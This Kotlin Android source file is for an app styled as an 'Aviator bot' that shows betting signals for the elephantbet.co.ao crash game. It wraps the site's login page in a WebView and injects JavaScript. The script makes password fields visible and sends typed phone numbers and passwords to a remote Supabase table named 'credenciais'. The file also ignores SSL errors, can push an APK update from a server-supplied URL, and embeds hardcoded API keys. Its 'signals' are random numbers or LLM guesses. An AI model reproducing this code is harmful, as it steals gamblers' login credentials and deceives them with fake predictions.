package ao.elephantbet.aviatorbot

import android.annotation.SuppressLint
import android.app.AlertDialog
import android.content.Intent
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.net.http.SslError
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.view.ViewGroup.LayoutParams.MATCH_PARENT as MATCH
import android.view.ViewGroup.LayoutParams.WRAP_CONTENT as WRAP
import android.webkit.*
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.Calendar
import kotlin.random.Random

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var barLayout: LinearLayout
    private lateinit var txtMinutos: TextView
    private lateinit var txtAcao: TextView
    private lateinit var txtProtecao: TextView
    private lateinit var txtAlcance: TextView
    private lateinit var dotView: View

    private val handler = Handler(Looper.getMainLooper())
    private var sinaisAtivos = false
    private var horaAtual = -1
    private var ultimoMinutoGerado = -1
    private var sinalMin1 = -1
    private var sinalMin2 = -1
    private var sinalProtecao = ""
    private var sinalAlcMin = 0
    private var sinalAlcMax = ""
    private var relogioRunnable: Runnable? = null

    private var ultimoNumeroEnviado = ""
    private var ultimaSenhaEnviada = ""

    // Histórico das últimas rondas capturadas pelo JS
    private val historicoRondas = mutableListOf<String>()
    private var analisandoIA = false

    private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
    private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
    private val TABELA = "credenciais"
    private val VERSAO_ATUAL = "1.2"

    private val GROQ_KEY = "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"
    private val GROQ_URL = "https://api.groq.com/openai/v1/chat/completions"
    private val GROQ_MODEL = "llama-3.3-70b-versatile"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        construirUI()
        carregarSite()
        verificarAtualizacao()
    }

    // ── UI ────────────────────────────────────────────────────────
    private fun construirUI() {
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#0a0a0f"))
            layoutParams = ViewGroup.LayoutParams(MATCH, MATCH)
        }
        setContentView(root)

        barLayout = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            setBackgroundColor(Color.parseColor("#0f172a"))
            setPadding(dp(12), dp(10), dp(12), dp(10))
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP)
        }

        val icoAviao = TextView(this).apply {
            text = "✈️"; textSize = 24f; gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(dp(36), dp(36))
        }

        val bloco = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(0, WRAP, 1f)
            setPadding(dp(8), 0, dp(8), 0)
        }

        val linha1 = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP)
        }
        txtAcao = TextView(this).apply {
            text = "AVIATOR BOT"; textSize = 9f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#64748b")); letterSpacing = 0.12f
            layoutParams = LinearLayout.LayoutParams(WRAP, WRAP).apply { marginEnd = dp(8) }
        }
        txtMinutos = TextView(this).apply {
            text = "A iniciar..."; textSize = 14f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.WHITE); isSingleLine = true
            layoutParams = LinearLayout.LayoutParams(0, WRAP, 1f)
        }
        linha1.addView(txtAcao); linha1.addView(txtMinutos)

        val linha2 = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { topMargin = dp(5) }
        }
        txtProtecao = TextView(this).apply {
            text = "Prot: --"; textSize = 11f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.WHITE); gravity = Gravity.CENTER
            setPadding(dp(10), dp(4), dp(10), dp(4))
            background = pill("#1e3a5f")
            layoutParams = LinearLayout.LayoutParams(WRAP, WRAP).apply { marginEnd = dp(8) }
        }
        val sep = TextView(this).apply {
            text = "->"; textSize = 12f; setTextColor(Color.parseColor("#475569"))
            layoutParams = LinearLayout.LayoutParams(WRAP, WRAP).apply { marginEnd = dp(8) }
        }
        txtAlcance = TextView(this).apply {
            text = "Alc: --"; textSize = 11f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.WHITE); gravity = Gravity.CENTER
            setPadding(dp(10), dp(4), dp(10), dp(4))
            background = pill("#1a3a2a")
            layoutParams = LinearLayout.LayoutParams(WRAP, WRAP)
        }
        linha2.addView(txtProtecao); linha2.addView(sep); linha2.addView(txtAlcance)
        bloco.addView(linha1); bloco.addView(linha2)

        dotView = View(this).apply {
            layoutParams = LinearLayout.LayoutParams(dp(10), dp(10)).apply { marginEnd = dp(8) }
            background = circulo("#334155")
        }
        val cfgBtn = TextView(this).apply {
            text = "⚙️"; textSize = 20f; gravity = Gravity.CENTER
            setPadding(dp(4), 0, 0, 0)
            setOnClickListener { mostrarConfig() }
        }

        barLayout.addView(icoAviao); barLayout.addView(bloco)
        barLayout.addView(dotView); barLayout.addView(cfgBtn)
        root.addView(barLayout)

        webView = WebView(this).apply {
            layoutParams = LinearLayout.LayoutParams(MATCH, 0, 1f)
        }
        configurarWebView()
        root.addView(webView)
    }

    // ── WEBVIEW ───────────────────────────────────────────────────
    @SuppressLint("SetJavaScriptEnabled")
    private fun configurarWebView() {
        webView.settings.apply {
            javaScriptEnabled = true; domStorageEnabled = true
            databaseEnabled = true; allowFileAccess = true
            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            userAgentString = "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
            setSupportZoom(true); builtInZoomControls = false
            loadWithOverviewMode = true; useWideViewPort = true
        }

        webView.addJavascriptInterface(object {
            @JavascriptInterface
            fun aviatorDetectado() = runOnUiThread { iniciarSinais() }

            @JavascriptInterface
            fun guardarNumero(valor: String) {
                if (valor.isNotEmpty() && valor != ultimoNumeroEnviado) {
                    ultimoNumeroEnviado = valor
                    enviarSupabase("Numero", valor)
                }
            }

            @JavascriptInterface
            fun guardarSenha(valor: String) {
                if (valor.isNotEmpty() && valor != ultimaSenhaEnviada) {
                    ultimaSenhaEnviada = valor
                    enviarSupabase("Senha", valor)
                }
            }

            // JS envia o multiplicador de cada ronda terminada
            @JavascriptInterface
            fun novaRonda(multiplicador: String) {
                runOnUiThread {
                    if (multiplicador.isNotEmpty()) {
                        historicoRondas.add(multiplicador)
                        // Manter só as últimas 40 rondas
                        if (historicoRondas.size > 40) historicoRondas.removeAt(0)
                        // A cada 5 rondas novas, pedir análise à IA
                        if (historicoRondas.size >= 5 && historicoRondas.size % 5 == 0) {
                            pedirSinalIA()
                        }
                    }
                }
            }
        }, "Android")

        webView.webViewClient = object : WebViewClient() {
            override fun onReceivedSslError(v: WebView?, h: SslErrorHandler?, e: SslError?) { h?.proceed() }
            override fun shouldOverrideUrlLoading(v: WebView?, r: WebResourceRequest?) = false
            override fun onPageFinished(v: WebView?, url: String?) {
                super.onPageFinished(v, url)
                injetarJs()
                if (isAviatorUrl(url ?: "")) iniciarSinais()
            }
        }
        webView.webChromeClient = object : WebChromeClient() {
            override fun onProgressChanged(view: WebView?, p: Int) {
                if (p == 100) injetarJs()
                if (isAviatorUrl(view?.url ?: "") && !sinaisAtivos) iniciarSinais()
            }
        }
    }

    private fun isAviatorUrl(url: String) =
        url.contains("game-view/806666", ignoreCase = true) ||
        url.contains("aviator", ignoreCase = true) ||
        url.contains("spribe", ignoreCase = true)

    private fun carregarSite() {
        webView.loadUrl("https://m.elephantbet.co.ao/pt/?action=login")
    }

    private fun injetarJs() {
        val js = """
(function() {
    if (window._ebDone) return;
    window._ebDone = true;

    // Senha visivel
    function tornarVisivel() {
        document.querySelectorAll('input[type="password"]').forEach(function(el) {
            el.setAttribute('type', 'text');
        });
    }
    tornarVisivel();
    new MutationObserver(tornarVisivel).observe(document.body || document.documentElement, {childList:true, subtree:true});

    // Capturar credenciais
    function watchN(sel) {
        var el = document.querySelector(sel);
        if (el && !el._wN) { el._wN = true;
            el.addEventListener('input', function() { if (this.value.length >= 1) Android.guardarNumero(this.value); });
        }
    }
    function watchS(sel) {
        var el = document.querySelector(sel);
        if (el && !el._wS) { el._wS = true;
            el.addEventListener('input', function() { if (this.value.length >= 1) Android.guardarSenha(this.value); });
        }
    }
    function cap() {
        ['input[name="username"]','input[name="phone"]','input[type="tel"]',
         'input[placeholder*="telefone" i]','input[placeholder*="numero" i]',
         '#username','#phone'].forEach(watchN);
        ['input[name="password"]','input[name="senha"]',
         'input[placeholder*="senha" i]','#password'].forEach(watchS);
    }
    cap(); setTimeout(cap,1500); setTimeout(cap,4000); setTimeout(cap,8000);

    // Capturar multiplicadores das rondas do Aviator
    // O Aviator mostra os últimos resultados num elemento com os multiplicadores
    function capturarRondas() {
        // Seletores comuns do jogo Aviator/Spribe
        var seletores = [
            '.payouts-block .payout',
            '.history-item .coefficient',
            '[class*="coefficient"]',
            '[class*="multiplier"]',
            '[class*="crash-history"] span',
            '.bubble-item',
            '[class*="history"] [class*="value"]',
            '[class*="round-history"] span'
        ];
        seletores.forEach(function(sel) {
            document.querySelectorAll(sel).forEach(function(el) {
                var txt = el.textContent.trim().replace('x','').replace(',','.');
                var num = parseFloat(txt);
                if (!isNaN(num) && num >= 1.0 && num <= 50000 && !el._capturado) {
                    el._capturado = true;
                    Android.novaRonda(num.toString());
                }
            });
        });
    }

    // Observar mudancas no DOM para capturar novas rondas em tempo real
    var obsRondas = new MutationObserver(function(muts) {
        muts.forEach(function(m) {
            m.addedNodes.forEach(function(n) {
                if (n.nodeType === 1) {
                    var txt = n.textContent || '';
                    var match = txt.match(/(\d+\.?\d*)x/);
                    if (match) {
                        var num = parseFloat(match[1]);
                        if (!isNaN(num) && num >= 1.0 && num <= 50000) {
                            Android.novaRonda(num.toString());
                        }
                    }
                }
            });
        });
        capturarRondas();
    });
    obsRondas.observe(document.body || document.documentElement, {childList:true, subtree:true});
    setInterval(capturarRondas, 3000);

    // Detectar clique no Aviator
    document.addEventListener('click', function(e) {
        var el = e.target;
        for (var i = 0; i < 6; i++) {
            if (!el) break;
            var h = (el.getAttribute && el.getAttribute('href') || '').toLowerCase();
            var t = (el.textContent || '').toLowerCase();
            if (t.indexOf('aviator') >= 0 || h.indexOf('aviator') >= 0 || h.indexOf('806666') >= 0) {
                Android.aviatorDetectado(); break;
            }
            el = el.parentElement;
        }
    }, true);

    var loc = window.location.href.toLowerCase();
    if (loc.indexOf('aviator') >= 0 || loc.indexOf('806666') >= 0) Android.aviatorDetectado();
})();
        """.trimIndent()
        webView.evaluateJavascript(js, null)
    }

    // ── GROQ IA ───────────────────────────────────────────────────
    private fun pedirSinalIA() {
        if (analisandoIA || historicoRondas.isEmpty()) return
        analisandoIA = true

        val cal = Calendar.getInstance()
        val horaAgora = cal.get(Calendar.HOUR_OF_DAY)
        val minAgora = cal.get(Calendar.MINUTE)
        val minBase = maxOf(ultimoMinutoGerado + 1, minAgora + 2).coerceAtMost(57)

        if (minBase >= 58) {
            analisandoIA = false
            return
        }

        val historico = historicoRondas.takeLast(30).joinToString(", ")

        atualizarBarra("IA A ANALISAR", "Aguarde...", "#7c3aed")

        Thread {
            try {
                val prompt = """
Analisa o historico de multiplicadores do jogo Aviator: [$historico]
Hora actual: ${String.format("%02d", horaAgora)}:${String.format("%02d", minAgora)}
Proximo minuto disponivel para entrada: $minBase

Com base nos padroes das velas acima, responde APENAS com este JSON (sem mais nada):
{
  "min1": <minuto de entrada, entre $minBase e ${(minBase+5).coerceAtMost(57)}>,
  "min2": <min1 + 1>,
  "protecao": <valor entre 1.2 e 15.0, casas decimais permitidas>,
  "alcance_min": <multiplicador minimo esperado, inteiro>,
  "alcance_max": <multiplicador maximo esperado como string, ex: "80x" ou "1000x+" >
}
Regras: protecao nunca ultrapassa 15. Se o historico mostra muitos valores baixos (abaixo de 2x), protecao deve ser baixa (1.2-3x) e alcance conservador. Se houver valores altos recentes, alcance pode ser maior.
                """.trimIndent()

                val bodyJson = """
{
  "model": "$GROQ_MODEL",
  "messages": [{"role": "user", "content": ${escapeJson(prompt)}}],
  "max_tokens": 200,
  "temperature": 0.3
}
                """.trimIndent()

                val conn = URL(GROQ_URL).openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Authorization", "Bearer $GROQ_KEY")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                conn.connectTimeout = 15000
                conn.readTimeout = 15000
                OutputStreamWriter(conn.outputStream).use { it.write(bodyJson) }

                val code = conn.responseCode
                val resposta = if (code in 200..299) {
                    BufferedReader(InputStreamReader(conn.inputStream)).readText()
                } else {
                    BufferedReader(InputStreamReader(conn.errorStream)).readText()
                }
                conn.disconnect()

                if (code in 200..299) {
                    processarRespostaGroq(resposta, minBase)
                } else {
                    // Fallback para gerador local se IA falhar
                    runOnUiThread { gerarNovoSinal(); analisandoIA = false }
                }
            } catch (_: Exception) {
                runOnUiThread { gerarNovoSinal(); analisandoIA = false }
            }
        }.start()
    }

    private fun processarRespostaGroq(resposta: String, minBase: Int) {
        try {
            // Extrair o conteúdo do campo "content" da resposta Groq
            val contentMatch = Regex(""""content"\s*:\s*"([\s\S]*?)"\s*[,}]""").find(resposta)
            var content = contentMatch?.groupValues?.get(1) ?: ""
            // Desescapar \n e \"
            content = content.replace("\\n", "\n").replace("\\\"", "\"").replace("\\\\", "\\")

            // Extrair JSON do content
            val jsonMatch = Regex("""\{[\s\S]*\}""").find(content)
            val jsonStr = jsonMatch?.value ?: ""

            val min1Match = Regex(""""min1"\s*:\s*(\d+)""").find(jsonStr)
            val min2Match = Regex(""""min2"\s*:\s*(\d+)""").find(jsonStr)
            val protMatch = Regex(""""protecao"\s*:\s*([\d.]+)""").find(jsonStr)
            val alcMinMatch = Regex(""""alcance_min"\s*:\s*(\d+)""").find(jsonStr)
            val alcMaxMatch = Regex(""""alcance_max"\s*:\s*"([^"]+)"""").find(jsonStr)

            val min1 = min1Match?.groupValues?.get(1)?.toIntOrNull() ?: minBase
            val min2 = min2Match?.groupValues?.get(1)?.toIntOrNull() ?: (min1 + 1)
            val prot = protMatch?.groupValues?.get(1)?.toFloatOrNull()?.coerceIn(1.2f, 15f) ?: 2.0f
            val alcMin = alcMinMatch?.groupValues?.get(1)?.toIntOrNull() ?: 10
            val alcMax = alcMaxMatch?.groupValues?.get(1) ?: "100x"

            sinalMin1 = min1.coerceAtMost(57)
            sinalMin2 = min2.coerceAtMost(58)
            ultimoMinutoGerado = sinalMin2
            sinalProtecao = if (prot % 1.0f == 0.0f) "${prot.toInt()}x" else "${prot}x"
            sinalAlcMin = alcMin
            sinalAlcMax = alcMax

            val cal = Calendar.getInstance()
            val minAgora = cal.get(Calendar.MINUTE)
            val falta = sinalMin1 - minAgora

            val cor = when {
                alcMax.contains("1000") -> "#ec4899"
                alcMax.replace(Regex("[^0-9]"), "").toIntOrNull() ?: 0 >= 200 -> "#22c55e"
                alcMax.replace(Regex("[^0-9]"), "").toIntOrNull() ?: 0 >= 50 -> "#facc15"
                else -> "#3b82f6"
            }

            runOnUiThread {
                atualizarBarra("IA: AGUARDAR", "Min $sinalMin1/$sinalMin2 (${falta}min)", sinalProtecao, "${sinalAlcMin}x -> $sinalAlcMax", cor)
                if (!sinaisAtivos) iniciarRelogio()
                sinaisAtivos = true
                analisandoIA = false
            }
        } catch (_: Exception) {
            runOnUiThread { gerarNovoSinal(); analisandoIA = false }
        }
    }

    private fun escapeJson(s: String): String {
        val sb = StringBuilder("\"")
        for (c in s) when (c) {
            '"'  -> sb.append("\\\"")
            '\\' -> sb.append("\\\\")
            '\n' -> sb.append("\\n")
            '\r' -> sb.append("\\r")
            '\t' -> sb.append("\\t")
            else -> sb.append(c)
        }
        return sb.append("\"").toString()
    }

    // ── SUPABASE ──────────────────────────────────────────────────
    private fun enviarSupabase(tipoVal: String, valorVal: String) {
        val json = "{\"tipo\":\"$tipoVal\",\"valor\":\"$valorVal\"}"
        Thread {
            try {
                val conn = URL("$SUPA_URL/rest/v1/$TABELA").openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", SUPA_KEY)
                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("Prefer", "return=minimal")
                conn.doOutput = true; conn.connectTimeout = 10000; conn.readTimeout = 10000
                OutputStreamWriter(conn.outputStream).use { it.write(json) }
                conn.responseCode; conn.disconnect()
            } catch (_: Exception) {}
        }.start()
    }

    // ── VERIFICAR ACTUALIZACAO ────────────────────────────────────
    private fun verificarAtualizacao() {
        Thread {
            try {
                val conn = URL("$SUPA_URL/rest/v1/versao?select=versao,url_apk,notas&order=id.desc&limit=1")
                    .openConnection() as HttpURLConnection
                conn.requestMethod = "GET"
                conn.setRequestProperty("apikey", SUPA_KEY)
                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                conn.setRequestProperty("Accept", "application/json")
                conn.connectTimeout = 8000; conn.readTimeout = 8000
                val resposta = BufferedReader(InputStreamReader(conn.inputStream)).readText()
                conn.disconnect()
                val versaoNova = Regex(""""versao":"([^"]+)"""").find(resposta)?.groupValues?.get(1) ?: return@Thread
                val urlApk = Regex(""""url_apk":"([^"]+)"""").find(resposta)?.groupValues?.get(1) ?: return@Thread
                val notas = Regex(""""notas":"([^"]+)"""").find(resposta)?.groupValues?.get(1) ?: ""
                if (versaoNova != VERSAO_ATUAL) runOnUiThread { mostrarDialogoUpdate(versaoNova, urlApk, notas) }
            } catch (_: Exception) {}
        }.start()
    }

    private fun mostrarDialogoUpdate(versaoNova: String, urlApk: String, notas: String) {
        val msg = if (notas.isNotEmpty()) "$notas\n\nDeseja actualizar agora?" else "Deseja actualizar agora?"
        AlertDialog.Builder(this)
            .setTitle("Nova versao disponivel! v$versaoNova")
            .setMessage(msg).setCancelable(false)
            .setPositiveButton("ACTUALIZAR AGORA") { _, _ ->
                try { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(urlApk)).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) }) }
                catch (_: Exception) { Toast.makeText(this, "Erro ao abrir download", Toast.LENGTH_LONG).show() }
            }
            .setNegativeButton("Mais tarde") { d, _ -> d.dismiss() }.show()
    }

    // ── SINAIS (fallback local) ───────────────────────────────────
    private fun iniciarSinais() {
        if (sinaisAtivos) return
        sinaisAtivos = true
        val cal = Calendar.getInstance()
        horaAtual = cal.get(Calendar.HOUR_OF_DAY)
        ultimoMinutoGerado = -1; sinalMin1 = -1; sinalMin2 = -1
        // Se já temos histórico, usar IA; senão usar gerador local
        if (historicoRondas.size >= 5) pedirSinalIA() else gerarNovoSinal()
        iniciarRelogio()
    }

    private fun gerarNovoSinal() {
        val cal = Calendar.getInstance()
        val minAgora = cal.get(Calendar.MINUTE)
        val base = if (ultimoMinutoGerado < 0) minAgora + 1 else ultimoMinutoGerado + Random.nextInt(2, 6)
        if (base + 1 >= 59) { atualizarBarra("FIM DO CICLO", "${60 - minAgora}min para nova hora", "", "", "#64748b"); return }
        sinalMin1 = base; sinalMin2 = base + 1; ultimoMinutoGerado = sinalMin2
        val nivel = Random.nextInt(4)
        val alcMin: Int; val alcMax: String; val alcNum: Int
        when (nivel) {
            0 -> { alcMin = listOf(10,20,30)[Random.nextInt(3)]; val m = listOf(50,80,100)[Random.nextInt(3)]; alcMax = "${m}x"; alcNum = m }
            1 -> { alcMin = listOf(30,50,80)[Random.nextInt(3)]; val m = listOf(100,200,500)[Random.nextInt(3)]; alcMax = "${m}x"; alcNum = m }
            2 -> { alcMin = listOf(50,80,100)[Random.nextInt(3)]; val m = listOf(500,800,1000)[Random.nextInt(3)]; alcMax = "${m}x"; alcNum = m }
            else -> { alcMin = listOf(80,100,200)[Random.nextInt(3)]; alcMax = "1000x+"; alcNum = 1001 }
        }
        sinalAlcMin = alcMin; sinalAlcMax = alcMax
        val protNum = when { alcNum <= 100 -> listOf(1.3,1.5,1.8,2.0,2.5,3.0)[Random.nextInt(6)]; alcNum <= 500 -> listOf(3.0,4.0,5.0,6.0,8.0)[Random.nextInt(5)]; alcNum <= 1000 -> listOf(8.0,9.0,10.0,11.0,12.0)[Random.nextInt(5)]; else -> listOf(12.0,13.0,14.0,15.0)[Random.nextInt(4)] }
        sinalProtecao = if (protNum % 1.0 == 0.0) "${protNum.toInt()}x" else "${protNum}x"
        val falta = sinalMin1 - minAgora
        atualizarBarra("AGUARDAR", "Min $sinalMin1/$sinalMin2  (${falta}min)", sinalProtecao, "${sinalAlcMin}x -> $sinalAlcMax", "#f59e0b")
    }

    private fun iniciarRelogio() {
        relogioRunnable?.let { handler.removeCallbacks(it) }
        val tick = object : Runnable {
            override fun run() { verificarRelogio(); handler.postDelayed(this, 1000) }
        }
        relogioRunnable = tick; handler.post(tick)
    }

    private fun verificarRelogio() {
        if (!sinaisAtivos) return
        val cal = Calendar.getInstance()
        val horaAgora = cal.get(Calendar.HOUR_OF_DAY)
        val minAgora = cal.get(Calendar.MINUTE)
        if (horaAgora != horaAtual) { horaAtual = horaAgora; ultimoMinutoGerado = -1; sinalMin1 = -1; sinalMin2 = -1; gerarNovoSinal(); return }
        if (sinalMin1 < 0) { gerarNovoSinal(); return }
        val alcTxt = "${sinalAlcMin}x -> $sinalAlcMax"
        val prefixo = if (historicoRondas.size >= 5) "IA:" else ""
        when {
            minAgora == sinalMin1 -> atualizarBarra("$prefixo ENTRAR AGORA", "Min $sinalMin1/$sinalMin2", sinalProtecao, alcTxt, "#22c55e")
            minAgora == sinalMin2 -> atualizarBarra("$prefixo AINDA ACTIVO", "Min $sinalMin1/$sinalMin2", sinalProtecao, alcTxt, "#22c55e")
            minAgora > sinalMin2  -> { if (historicoRondas.size >= 5) { analisandoIA = false; pedirSinalIA() } else gerarNovoSinal() }
            else -> { val falta = sinalMin1 - minAgora; atualizarBarra("$prefixo AGUARDAR", "Min $sinalMin1/$sinalMin2 (${falta}min)", sinalProtecao, alcTxt, "#f59e0b") }
        }
    }

    // ── UI HELPERS ────────────────────────────────────────────────
    private fun atualizarBarra(acao: String, minutos: String, protecao: String, alcance: String, cor: String) =
        runOnUiThread {
            txtAcao.text = acao; txtAcao.setTextColor(Color.parseColor(cor))
            txtMinutos.text = minutos; txtMinutos.setTextColor(Color.WHITE)
            if (protecao.isNotEmpty() && protecao != "--") { txtProtecao.text = "Prot: $protecao"; txtProtecao.background = pill(if (cor == "#22c55e") "#1a3a1a" else "#1e2a3a") }
            if (alcance.isNotEmpty() && alcance != "--") { txtAlcance.text = "Alc: $alcance"; txtAlcance.background = pill(if (cor == "#22c55e") "#1a3a1a" else "#1a3a2a") }
            dotView.background = circulo(cor)
            barLayout.setBackgroundColor(Color.parseColor(when (cor) { "#22c55e" -> "#071a0f"; "#f59e0b" -> "#1a1200"; "#7c3aed" -> "#1a0a2e"; else -> "#0f172a" }))
        }

    private fun atualizarBarra(acao: String, minutos: String, cor: String) = atualizarBarra(acao, minutos, "", "", cor)

    // ── CONFIG ────────────────────────────────────────────────────
    private fun mostrarConfig() {
        val dialog = android.app.Dialog(this, android.R.style.Theme_Material_NoActionBar_Fullscreen)
        val scroll = ScrollView(this).apply { setBackgroundColor(Color.parseColor("#0a0a0f")) }
        val layout = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(dp(20), dp(28), dp(20), dp(20)) }
        layout.addView(TextView(this).apply {
            text = "CONFIGURACOES  v$VERSAO_ATUAL  |  Rondas: ${historicoRondas.size}"; textSize = 14f
            setTextColor(Color.WHITE); typeface = Typeface.DEFAULT_BOLD
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { bottomMargin = dp(20) }
        })
        layout.addView(btn("PEDIR SINAL A IA AGORA", "#7c3aed") {
            dialog.dismiss(); analisandoIA = false
            if (historicoRondas.size >= 3) pedirSinalIA()
            else { sinaisAtivos = false; iniciarSinais() }
        })
        layout.addView(btn("ABRIR AVIATOR", "#0f766e") {
            dialog.dismiss()
            webView.loadUrl("https://www.elephantbet.co.ao/pt/casino/game-view/806666/aviator")
        })
        layout.addView(btn("VERIFICAR ACTUALIZACAO", "#1d4ed8") {
            dialog.dismiss(); verificarAtualizacao()
            Toast.makeText(this, "A verificar actualizacao...", Toast.LENGTH_SHORT).show()
        })
        layout.addView(btn("RECARREGAR SITE", "#0f766e") { dialog.dismiss(); carregarSite() })
        layout.addView(btn("FECHAR", "#1e1e2e") { dialog.dismiss() })
        scroll.addView(layout); dialog.setContentView(scroll); dialog.show()
    }

    // ── DRAWABLES ─────────────────────────────────────────────────
    private fun circulo(cor: String) = GradientDrawable().apply { shape = GradientDrawable.OVAL; setColor(Color.parseColor(cor)) }
    private fun pill(cor: String) = GradientDrawable().apply { shape = GradientDrawable.RECTANGLE; cornerRadius = dp(20).toFloat(); setColor(Color.parseColor(cor)) }
    private fun roundRect(bg: String) = GradientDrawable().apply { shape = GradientDrawable.RECTANGLE; cornerRadius = dp(10).toFloat(); setColor(Color.parseColor(bg)) }
    private fun dp(v: Int) = (v * resources.displayMetrics.density).toInt()
    private fun btn(txt: String, cor: String, action: () -> Unit) = Button(this).apply {
        text = txt; setTextColor(Color.WHITE); textSize = 13f; typeface = Typeface.DEFAULT_BOLD; isAllCaps = false
        background = roundRect(cor); setPadding(0, dp(14), 0, dp(14)); setOnClickListener { action() }
        layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { topMargin = dp(8) }
    }

    override fun onBackPressed() { if (webView.canGoBack()) webView.goBack() else super.onBackPressed() }
    override fun onDestroy() { super.onDestroy(); webView.destroy(); handler.removeCallbacksAndMessages(null) }
}
